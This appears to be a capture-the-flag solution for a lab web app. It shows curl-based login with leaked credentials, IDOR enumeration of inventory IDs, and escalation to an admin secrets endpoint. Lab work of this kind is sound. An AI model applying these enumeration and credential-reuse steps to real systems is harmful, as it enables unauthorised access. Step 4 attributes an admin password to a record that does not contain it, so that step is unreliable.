# M2 — Red Team Solution: IDOR / Broken Access Control

**Machine:** aglg-warehouse | **Port:** 3000/tcp | **MITRE:** T1078, T1087

---

## Step 1 — Reconnaissance

```bash
nmap -sV -p 3000 11.0.0.0/8
# Navigate to http://<M2-IP>:3000/
# Check /.well-known/config and /api/docs
```

---

## Step 2 — Login with Leaked Credentials

From M1's hint.txt: `vendor_ops : V3nd0r@AGLG`

```bash
curl -s -X POST http://<M2-IP>:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"vendor_ops","password":"V3nd0r@AGLG"}'
# → {"token":"<TOKEN>","user":{"id":1,"username":"vendor_ops","role":"vendor"}}
export TOKEN="<TOKEN>"
```

---

## Step 3 — IDOR Enumeration

The `/api/inventory/:id` endpoint has **no ownership check**. Enumerate IDs:

```bash
for i in 0 1 2 3 4 5; do
  echo "=== ID $i ==="; \
  curl -s http://<M2-IP>:3000/api/inventory/$i -H "x-auth-token: $TOKEN"; echo
done
```

**ID 0 returns the admin object:**
```json
{
  "id": 0,
  "username": "admin",
  "role": "admin",
  "internal_note": "HR Portal migration complete. Creds: hr_ops : HR0ps@AGLG24 | SSH to aglg-hrportal:22",
  "flag": "FLAG{...}"
}
```

---

## Step 4 — Escalate to Admin Secrets

```bash
curl -s http://<M2-IP>:3000/api/admin/secrets -H "x-auth-token: $TOKEN"
# → 403 Forbidden (need admin token)
# Admin token: login as admin using creds from ID 0 record
curl -s -X POST http://<M2-IP>:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Wh@reh0use_Adm1n!"}'
export ADMIN_TOKEN="<ADMIN_TOKEN>"
curl -s http://<M2-IP>:3000/api/admin/secrets -H "x-auth-token: $ADMIN_TOKEN"
```

---

## Flag + Next Hop
- `FLAG{<hex>_idor_bac}` — in admin object at `/api/inventory/0` and `/api/admin/secrets`
- SSH creds for M3: `hr_ops : HR0ps@AGLG24`
